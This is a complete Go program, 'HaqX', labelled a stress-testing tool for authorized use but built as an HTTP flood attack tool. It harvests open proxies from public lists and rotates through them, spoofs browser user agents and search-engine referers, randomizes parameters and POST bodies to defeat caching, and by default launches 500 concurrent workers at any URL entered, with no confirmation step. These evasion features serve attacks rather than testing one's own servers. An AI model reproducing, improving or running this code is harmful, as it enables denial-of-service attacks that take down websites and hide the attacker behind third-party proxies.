package main

/*
 HaqX - Advanced Network Stress Testing Tool (Optimized - One Line Mode)
 For Educational & Authorized Testing Only
*/

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const VERSION = "4.0.3"
const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
const ACCEPT = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

type (
	Metric struct {
		sync.RWMutex
		Total    int64
		Errors   int64
		Codes    map[int]int64
		Started  time.Time
	}
	
	Target struct {
		URL         string
		Connections int
		Timeout     time.Duration
		Rate        int
		Data        string
		Headers     []string
		Agents      []string
		Referers    []string
		Safe        bool
		Verbose     bool
		Duration    int
		Method      string
		Proxy       bool
		Pool        []string
		ProxyStats  map[string]int
		Index       int
		CurrentProxy string
		OneLine     bool
		sync.Mutex
	}
	
	ProxyHunter struct {
		Sources   []string
		Cache     []string
		Tested    map[string]bool
		sync.Mutex
	}
	
	Factory struct {
		Clients []*http.Client
		sync.Mutex
		Next int
		Cfg  *Target
	}
	
	Throttle struct {
		Tickets   chan struct{}
		Tick      time.Duration
		sync.Mutex
		Refilled  time.Time
		Done      chan struct{}
		BurstSize int
	}
)

var (
	Stats  *Metric
	Debug  bool
	Secure bool
)

func init() {
	Stats = &Metric{
		Codes:   make(map[int]int64),
		Started: time.Now(),
	}
}

func NewConfig() *Target {
	return &Target{
		Timeout:     5 * time.Second,
		Rate:        1000,
		Connections: 500,
		Duration:    0,
		Method:      "GET",
		Proxy:       true,
		ProxyStats:  make(map[string]int),
		OneLine:     true,
		Agents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Linux; Android 13; SM-S918B) Chrome/120.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) Chrome/120.0.0.0 Mobile Safari/537.36",
			"curl/8.5.0",
			"Wget/1.21.4",
			"Python-urllib/3.11",
			"Go-http-client/2.0",
			"okhttp/4.12.0",
			"Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro Build/UP1A.231105.001)",
		},
		Referers: []string{
			"https://www.google.com/search?q=",
			"https://www.bing.com/search?q=",
			"https://duckduckgo.com/?q=",
			"https://www.reddit.com/search/?q=",
			"https://www.youtube.com/results?search_query=",
			"https://twitter.com/search?q=",
			"https://www.facebook.com/search/top?q=",
			"https://www.instagram.com/explore/search/?q=",
			"https://www.linkedin.com/search/results/all/?keywords=",
			"https://github.com/search?q=",
			"https://stackoverflow.com/search?q=",
			"https://www.tiktok.com/search?q=",
			"https://www.pinterest.com/search/pins/?q=",
			"https://www.tumblr.com/search/",
		},
	}
}

func (t *Target) NextProxy() string {
	t.Lock()
	defer t.Unlock()
	if len(t.Pool) == 0 { return "" }
	
	for attempts := 0; attempts < len(t.Pool); attempts++ {
		proxy := t.Pool[t.Index]
		t.Index = (t.Index + 1) % len(t.Pool)
		
		if t.ProxyStats[proxy] < 3 {
			t.CurrentProxy = proxy
			return proxy
		}
	}
	proxy := t.Pool[t.Index]
	t.CurrentProxy = proxy
	return proxy
}

func (t *Target) MarkProxy(success bool) {
	t.Lock()
	defer t.Unlock()
	if t.CurrentProxy == "" { return }
	if success {
		t.ProxyStats[t.CurrentProxy] = 0
	} else {
		t.ProxyStats[t.CurrentProxy]++
	}
}

func Hunter() *ProxyHunter {
	return &ProxyHunter{
		Sources: []string{
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://api.openproxylist.xyz/http.txt",
			"https://api.openproxylist.xyz/socks4.txt",
			"https://api.openproxylist.xyz/socks5.txt",
		},
		Tested: make(map[string]bool),
	}
}

func (h *ProxyHunter) Harvest() []string {
	h.Lock()
	defer h.Unlock()
	
	var all []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	
	var wg sync.WaitGroup
	results := make(chan []string, len(h.Sources))
	
	for _, src := range h.Sources {
		wg.Add(1)
		go func(source string) {
			defer wg.Done()
			resp, err := client.Get(source)
			if err != nil { return }
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			
			var proxies []string
			lines := strings.Split(string(body), "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line == "" || strings.HasPrefix(line, "#") { continue }
				if strings.Contains(line, ":") {
					proxies = append(proxies, line)
				}
			}
			results <- proxies
		}(src)
	}
	
	go func() {
		wg.Wait()
		close(results)
	}()
	
	for proxies := range results {
		all = append(all, proxies...)
	}
	
	seen := make(map[string]bool)
	var unique []string
	for _, p := range all {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}
	
	fmt.Printf("🔍 Testing %d proxies... ", len(unique))
	var fastProxies []string
	var mu sync.Mutex
	var wgFilter sync.WaitGroup
	
	sem := make(chan struct{}, 50)
	for _, proxy := range unique {
		wgFilter.Add(1)
		go func(p string) {
			defer wgFilter.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			
			if h.TestProxy(p) {
				mu.Lock()
				fastProxies = append(fastProxies, p)
				mu.Unlock()
			}
		}(proxy)
	}
	wgFilter.Wait()
	
	fmt.Printf("✅ %d fast proxies\n", len(fastProxies))
	return fastProxies
}

func (h *ProxyHunter) TestProxy(proxy string) bool {
	client := &http.Client{
		Timeout: 2 * time.Second,
		Transport: &http.Transport{
			Proxy: func(req *http.Request) (*url.URL, error) {
				return url.Parse("http://" + proxy)
			},
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			DialContext: (&net.Dialer{
				Timeout:   1 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		},
	}
	
	resp, err := client.Get("http://httpbin.org/ip")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	return resp.StatusCode == 200
}

func BuildFactory(size int, timeout time.Duration, cfg *Target) *Factory {
	pool := &Factory{
		Clients: make([]*http.Client, size),
		Cfg:     cfg,
	}
	for i := 0; i < size; i++ {
		pool.Clients[i] = pool.NewClient()
	}
	return pool
}

func (f *Factory) NewClient() *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        500,
		MaxIdleConnsPerHost: 50,
		MaxConnsPerHost:     50,
		IdleConnTimeout:     30 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives:   false,
		DisableCompression:  false,
		ForceAttemptHTTP2:   true,
		DialContext: (&net.Dialer{
			Timeout:   2 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	
	if f.Cfg.Proxy && len(f.Cfg.Pool) > 0 {
		proxy := f.Cfg.NextProxy()
		if proxy != "" {
			if p, err := url.Parse("http://" + proxy); err == nil {
				tr.Proxy = http.ProxyURL(p)
			}
		}
	}
	
	return &http.Client{
		Timeout:   f.Cfg.Timeout,
		Transport: tr,
	}
}

func (f *Factory) Acquire() *http.Client {
	f.Lock()
	defer f.Unlock()
	
	if f.Cfg.Proxy && len(f.Cfg.Pool) > 0 {
		return f.NewClient()
	}
	
	client := f.Clients[f.Next]
	f.Next = (f.Next + 1) % len(f.Clients)
	return client
}

func (f *Factory) Release() {
	for _, c := range f.Clients {
		if c.Transport != nil {
			if tr, ok := c.Transport.(*http.Transport); ok {
				tr.CloseIdleConnections()
			}
		}
	}
}

func NewThrottle(rate int) *Throttle {
	if rate <= 0 { return nil }
	
	burstSize := rate * 5
	t := &Throttle{
		Tickets:   make(chan struct{}, burstSize),
		Tick:      time.Second / time.Duration(rate),
		Done:      make(chan struct{}),
		Refilled:  time.Now(),
		BurstSize: burstSize,
	}
	
	for i := 0; i < burstSize; i++ {
		select {
		case t.Tickets <- struct{}{}:
		default:
		}
	}
	
	go t.Pump()
	return t
}

func (t *Throttle) Pump() {
	ticker := time.NewTicker(t.Tick)
	defer ticker.Stop()
	
	for {
		select {
		case <-t.Done:
			return
		case <-ticker.C:
			t.Lock()
			now := time.Now()
			if now.Sub(t.Refilled) >= t.Tick {
				for i := 0; i < 5; i++ {
					select {
					case t.Tickets <- struct{}{}:
					default:
						break
					}
				}
				t.Refilled = now
			}
			t.Unlock()
		}
	}
}

func (t *Throttle) Stop() {
	if t != nil {
		close(t.Done)
	}
}

func (t *Throttle) Wait(ctx context.Context) error {
	select {
	case <-t.Tickets:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

func main() {
	cfg := NewConfig()
	
	var (
		showVer bool
		agents  string
		custom  arrayFlags
		conns   int
		to      int
		rate    int
		dur     int
		method  string
		noprox  bool
		site    string
	)

	flag.BoolVar(&showVer, "v", false, "Show version")
	flag.BoolVar(&Secure, "safe", false, "Safe mode")
	flag.BoolVar(&Debug, "debug", false, "Debug mode")
	flag.BoolVar(&noprox, "noprox", false, "Disable proxies")
	flag.StringVar(&agents, "agents", "", "User-agent file")
	flag.StringVar(&cfg.Data, "data", "", "POST data")
	flag.StringVar(&site, "site", "", "Target URL")
	flag.IntVar(&conns, "c", 0, "Connections (default: 500)")
	flag.IntVar(&to, "t", 0, "Timeout seconds (default: 5)")
	flag.IntVar(&rate, "r", 0, "Rate limit (default: 1000)")
	flag.IntVar(&dur, "d", 0, "Duration seconds")
	flag.StringVar(&method, "m", "", "HTTP method")
	flag.Var(&custom, "H", "Custom headers")
	flag.Parse()

	if showVer {
		fmt.Printf("HaqX v%s\n", VERSION)
		return
	}

	cfg.Headers = custom
	if conns > 0 { cfg.Connections = conns }
	if to > 0 { cfg.Timeout = time.Duration(to) * time.Second }
	if rate > 0 { cfg.Rate = rate }
	if dur > 0 { cfg.Duration = dur }
	if method != "" { cfg.Method = strings.ToUpper(method) }
	if noprox { cfg.Proxy = false }
	
	Banner()
	
	reader := bufio.NewReader(os.Stdin)
	
	// If site provided via flag, use it
	if site != "" {
		cfg.URL = site
	} else {
		fmt.Print("🎯 Target URL: ")
		target, _ := reader.ReadString('\n')
		target = strings.TrimSpace(target)
		for target == "" {
			fmt.Print("⚠️  Target required: ")
			target, _ = reader.ReadString('\n')
			target = strings.TrimSpace(target)
		}
		cfg.URL = target
	}
	
	if !strings.HasPrefix(cfg.URL, "http://") && !strings.HasPrefix(cfg.URL, "https://") {
		cfg.URL = "http://" + cfg.URL
	}
	
	parsed, err := url.Parse(cfg.URL)
	if err != nil {
		fmt.Printf("❌ Invalid URL: %v\n", err)
		return
	}

	if cfg.Proxy {
		fmt.Println("🌐 Harvesting & filtering proxies...")
		hunter := Hunter()
		proxies := hunter.Harvest()
		if len(proxies) > 0 {
			cfg.Pool = proxies
		} else {
			cfg.Proxy = false
		}
	}

	// One-line config - skip all confirmations
	if cfg.OneLine {
		fmt.Printf("🚀 Starting: %s | Workers: %d | Timeout: %v | Rate: %d req/s", 
			cfg.URL, cfg.Connections, cfg.Timeout, cfg.Rate)
		if cfg.Proxy && len(cfg.Pool) > 0 {
			fmt.Printf(" | Proxies: %d", len(cfg.Pool))
		}
		fmt.Println()
	}

	Stats = &Metric{
		Codes:   make(map[int]int64),
		Started: time.Now(),
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\n⚠️  Interrupted")
		cancel()
	}()

	factory := BuildFactory(50, cfg.Timeout, cfg)
	defer factory.Release()

	var throttle *Throttle
	if cfg.Rate > 0 {
		throttle = NewThrottle(cfg.Rate)
		defer throttle.Stop()
	}

	Launch(ctx, cancel, cfg, parsed, factory, throttle)

	ShowStats()
}

func RandomData() string {
	fields := []string{"user", "email", "pass", "name", "msg", "comment", "search", "query", "data", "value", "id", "token"}
	var parts []string
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 5+rng.Intn(5); i++ {
		key := fields[rng.Intn(len(fields))]
		val := RandomString(5+rng.Intn(15), rng)
		parts = append(parts, fmt.Sprintf("%s=%s", key, val))
	}
	return strings.Join(parts, "&")
}

func RandomString(n int, rng *rand.Rand) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = CHARSET[rng.Intn(len(CHARSET))]
	}
	return string(b)
}

func RandomParams(rng *rand.Rand) string {
	n := 3 + rng.Intn(10)
	var parts []string
	for i := 0; i < n; i++ {
		k := RandomString(3+rng.Intn(10), rng)
		v := RandomString(3+rng.Intn(15), rng)
		parts = append(parts, fmt.Sprintf("%s=%s", k, v))
	}
	return strings.Join(parts, "&")
}

func Joiner(u *url.URL) string {
	if u.RawQuery != "" || strings.ContainsRune(u.RawQuery, '?') {
		return "&"
	}
	return "?"
}

func Launch(ctx context.Context, cancel context.CancelFunc, cfg *Target, parsed *url.URL, factory *Factory, throttle *Throttle) {
	var wg sync.WaitGroup
	active := int32(0)
	done := make(chan struct{}, cfg.Connections)
	
	if cfg.Duration > 0 {
		timer := time.NewTimer(time.Duration(cfg.Duration) * time.Second)
		go func() {
			<-timer.C
			cancel()
		}()
	}

	for i := 0; i < cfg.Connections; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() { done <- struct{}{} }()
			atomic.AddInt32(&active, 1)
			defer atomic.AddInt32(&active, -1)
			Worker(ctx, id, cfg, parsed, factory, throttle)
		}(i)
	}

	monitor := make(chan struct{})
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Println()
				return
			case <-monitor:
				return
			case <-ticker.C:
				Stats.RLock()
				sent := Stats.Total
				errs := Stats.Errors
				Stats.RUnlock()
				active := atomic.LoadInt32(&active)
				elapsed := time.Since(Stats.Started).Seconds()
				var rate float64
				if elapsed > 0 {
					rate = float64(sent) / elapsed
				}
				fmt.Printf("\r📊 %d req | ❌ %d err | 🔥 %d active | ⚡ %.1f req/s | ⏱️ %v",
					sent, errs, active, rate, time.Since(Stats.Started).Round(time.Second))
			}
		}
	}()

	wg.Wait()
	close(monitor)
	close(done)
	for range done {}
}

func Worker(ctx context.Context, id int, cfg *Target, parsed *url.URL, factory *Factory, throttle *Throttle) {
	host := parsed.Host
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
	
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if throttle != nil {
				if err := throttle.Wait(ctx); err != nil {
					return
				}
			}
			
			client := factory.Acquire()
			success := Fire(ctx, client, cfg, parsed, host, rng)
			
			if success {
				atomic.AddInt64(&Stats.Total, 1)
			} else {
				atomic.AddInt64(&Stats.Errors, 1)
			}
		}
	}
}

func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL, host string, rng *rand.Rand) bool {
	var req *http.Request
	var err error
	
	for attempt := 0; attempt < 3; attempt++ {
		select {
		case <-ctx.Done():
			return false
		default:
			if cfg.Method == "POST" {
				var body io.Reader
				if cfg.Data != "" {
					body = strings.NewReader(cfg.Data)
				} else {
					body = strings.NewReader(RandomData())
				}
				req, err = http.NewRequestWithContext(ctx, "POST", cfg.URL, body)
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else {
				params := RandomParams(rng)
				full := fmt.Sprintf("%s%s%s", cfg.URL, Joiner(parsed), params)
				req, err = http.NewRequestWithContext(ctx, "GET", full, nil)
			}
			
			if err != nil {
				return false
			}
			
			Arm(req, cfg, host, rng)
			
			resp, err := client.Do(req)
			if err != nil {
				if attempt < 2 {
					time.Sleep(time.Duration(50*(1<<uint(attempt))) * time.Millisecond)
					continue
				}
				cfg.MarkProxy(false)
				return false
			}
			defer resp.Body.Close()
			
			io.Copy(io.Discard, resp.Body)
			
			Stats.Lock()
			Stats.Codes[resp.StatusCode]++
			Stats.Unlock()
			
			success := resp.StatusCode == 200
			cfg.MarkProxy(success)
			
			if Secure && resp.StatusCode >= 500 {
				return false
			}
			
			return success
		}
	}
	
	cfg.MarkProxy(false)
	return false
}

func Arm(req *http.Request, cfg *Target, host string, rng *rand.Rand) {
	ua := cfg.Agents[rng.Intn(len(cfg.Agents))]
	req.Header.Set("User-Agent", ua)
	
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", ACCEPT)
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	
	if len(cfg.Referers) > 0 {
		ref := cfg.Referers[rng.Intn(len(cfg.Referers))] + RandomString(5+rng.Intn(10), rng)
		req.Header.Set("Referer", ref)
	}
	
	req.Header.Set("Keep-Alive", strconv.Itoa(100+rng.Intn(20)))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", host)
	
	if rng.Intn(2) == 0 {
		req.Header.Set("DNT", "1")
	}
	if rng.Intn(3) == 0 {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	
	for _, h := range cfg.Headers {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}
}

func Banner() {
	fmt.Println("\033[97m" + ` ██░ ██  ▄▄▄       ██▓ ▄▄▄██▀▀▀
▓██░ ██▒▒████▄    ▓██▒   ▒██   
▒██▀▀██░▒██  ▀█▄  ▒██▒   ░██   
░▓█ ░██ ░██▄▄▄▄██ ░██░▓██▄██▓  
░▓█▒░██▓ ▓█   ▓██▒░██░ ▓███▒   
 ▒ ░░▒░▒ ▒▒   ▓▒█░░▓   ▒▓▒▒░   
 ▒ ░▒░ ░  ▒   ▒▒ ░ ▒ ░ ▒ ░▒░   
 ░  ░░ ░  ░   ▒    ▒ ░ ░ ░ ░   
 ░  ░  ░      ░  ░ ░   ░   ░   
` + "\033[0m")
	fmt.Println("\033[97m" + "🔥 HaqX v" + VERSION + " ⚡" + "\033[0m")
	fmt.Println("\033[97m" + "Educational & Authorized Testing Only" + "\033[0m")
	fmt.Println()
}

func ShowStats() {
	Stats.RLock()
	defer Stats.RUnlock()
	
	duration := time.Since(Stats.Started).Round(time.Second)
	total := Stats.Total + Stats.Errors
	var rate float64
	if total > 0 {
		rate = float64(Stats.Total) / float64(total) * 100
	}
	
	fmt.Println()
	fmt.Println("📊 Final Statistics")
	fmt.Printf("  ✅ Success:  %d\n", Stats.Total)
	fmt.Printf("  ❌ Errors:   %d\n", Stats.Errors)
	fmt.Printf("  📈 Rate:     %.2f%%\n", rate)
	fmt.Printf("  ⏱️  Duration: %v\n", duration)
	
	if duration.Seconds() > 0 {
		fmt.Printf("  🚀 Req/s:    %.2f\n", float64(Stats.Total)/duration.Seconds())
	}
	
	fmt.Println()
	fmt.Println("  📋 Status Codes:")
	if len(Stats.Codes) > 0 {
		for code, count := range Stats.Codes {
			fmt.Printf("    %d: %d\n", code, count)
		}
	} else {
		fmt.Println("    ❌ None recorded")
	}
	fmt.Println()
}

type arrayFlags []string

func (a *arrayFlags) String() string {
	return strings.Join(*a, ", ")
}

func (a *arrayFlags) Set(value string) error {
	*a = append(*a, value)
	return nil
}
